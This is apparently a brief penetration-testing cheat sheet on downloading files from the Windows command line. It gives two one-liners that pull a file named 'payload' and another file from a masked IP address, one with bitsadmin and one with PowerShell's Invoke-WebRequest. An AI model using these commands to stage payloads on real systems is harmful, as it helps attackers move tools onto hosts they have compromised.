Download files from CLI in Windows
------------------------------------
bitsadmin /transfer wcb /priority high https://xxx.xxx.xxx.xxx/payload.txt C:\payload.txt
powershell Invoke-WebRequest http://xxx.xxx.xxx.xxx/file.txt -O c:\file.txt

